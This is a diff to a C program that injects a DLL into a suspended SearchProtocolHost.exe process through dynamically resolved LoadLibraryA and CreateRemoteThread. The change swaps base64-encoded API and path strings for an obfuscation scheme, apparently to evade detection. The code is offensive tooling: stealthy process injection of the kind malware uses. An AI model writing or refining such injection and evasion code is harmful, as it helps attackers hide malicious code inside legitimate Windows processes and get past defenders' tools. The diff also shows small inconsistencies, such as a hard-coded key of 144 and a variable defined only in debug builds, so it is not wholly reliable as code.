@@ -13,7 +13,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     NTSTATUS status;
 
     // Resolve Required Functions
-    pMod pLLoad = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB")); // "LoadLibraryA"
+    pMod pLLoad = GetMod(obfs_decode(144,"[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
 
     if (!pLLoad)
     {
@@ -54,7 +54,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
         myDebug(DEBUG_SUCCESS, "Successfully write memory.");
     }
 
-    pMod pCRT = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUmVtb3RlVGhyZWFk")); //"CreateRemoteThread"
+    pMod pCRT = GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateRemoteThread"));
 
     if (!pCRT)
     {
@@ -114,26 +114,26 @@ int main(int argc, char *argv[])
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
 
-    // "C:\\Windows\\System32\\SearchProtocolHost.exe"
-    const char *procPath = "QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxTZWFyY2hQcm90b2NvbEhvc3QuZXhl";
-    // SearchProtocolHost.exe
-    const char *procName = "U2VhcmNoUHJvdG9jb2xIb3N0LmV4ZQ==";
+    char *procPath = "[OBFS_ENC]C:\\Windows\\System32\\SearchProtocolHost.exe";
+    #if DEBUG
+        char *procName = "[OBFS_ENC]SearchProtocolHost.exe";
+    #endif
 
     // Resolve CreateProcessA dynamically
-    pCPA_t pCPA = (pCPA_t)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUHJvY2Vzc0E="));
+    pCPA_t pCPA = (pCPA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateProcessA"));
 
     if (!pCPA) {
         printf("[!] Failed to resolve CreateProcessA\n");
         return -1;
     }
 
-    if (!pCPA(Bsfd(procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
+    if (!pCPA(obfs_decode(DECKEY, procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
         myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
         return -1;
     }
 
-    myDebug(DEBUG_INFO, "Suspended %s created.", Bsfd(procName));
+    myDebug(DEBUG_INFO, "Suspended %s created.", obfs_decode(DECKEY, procName));
 
     // Perform Injection
     StealthExec(pInfo.hProcess, dllPath);
@@ -142,7 +142,7 @@ int main(int argc, char *argv[])
     ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
     CloseHandle(pInfo.hThread);
-    myDebug(DEBUG_INFO, "%s is now running.", Bsfd(procName));
+    myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));
 
     return 0;
 }
